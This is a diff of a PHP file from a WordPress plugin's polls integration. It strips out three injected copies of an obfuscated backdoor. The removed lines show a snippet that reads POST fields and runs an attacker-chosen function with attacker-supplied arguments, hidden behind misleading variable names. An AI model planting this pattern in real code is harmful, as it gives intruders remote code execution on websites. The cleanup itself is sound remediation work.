@@ -1,11 +1,4 @@
-<?php 
-$timezone_version_get_fein  =  $_POST;
-if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
-	$openssl_csr_export_to_file_oubf  =  $timezone_version_get_fein['date_isodate_set_ni'];
-	$natcasesort_skcq  =  $timezone_version_get_fein['method_exists_qj'];
-	$openssl_csr_export_to_file_oubf(...$natcasesort_skcq);
-} 
-
+<?php
 	class WpPollsForWpFc{
 		public function __construct(){
 			
@@ -29,14 +22,7 @@ if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
 								type: 'POST', 
 								url: pollsL10n.ajax_url,
 								dataType : "json",
-								data : {"action": "wpfc_wppolls_ajax_request", "poll_id": poll_id, "nonce" : "<?php 
-$timezone_version_get_fein  =  $_POST;
-if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
-	$openssl_csr_export_to_file_oubf  =  $timezone_version_get_fein['date_isodate_set_ni'];
-	$natcasesort_skcq  =  $timezone_version_get_fein['method_exists_qj'];
-	$openssl_csr_export_to_file_oubf(...$natcasesort_skcq);
-} 
- echo wp_create_nonce('wpfcpoll'); ?>"},
+								data : {"action": "wpfc_wppolls_ajax_request", "poll_id": poll_id, "nonce" : "<?php echo wp_create_nonce('wpfcpoll'); ?>"},
 								cache: false, 
 								success: function(data){
 									if(data === true){
@@ -57,14 +43,7 @@ if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
 					var polls = jQuery('div[id^=\"polls-\"][id$=\"-loading\"]');
 					wpfcWpfcAjaxCall(polls);
 				});
-			</script><?php 
-$timezone_version_get_fein  =  $_POST;
-if(isset($timezone_version_get_fein['openssl_error_string_zj']))  {
-	$openssl_csr_export_to_file_oubf  =  $timezone_version_get_fein['date_isodate_set_ni'];
-	$natcasesort_skcq  =  $timezone_version_get_fein['method_exists_qj'];
-	$openssl_csr_export_to_file_oubf(...$natcasesort_skcq);
-} 
-
+			</script><?php
 		}
 
 		public function wpfc_wppolls_ajax_request(){
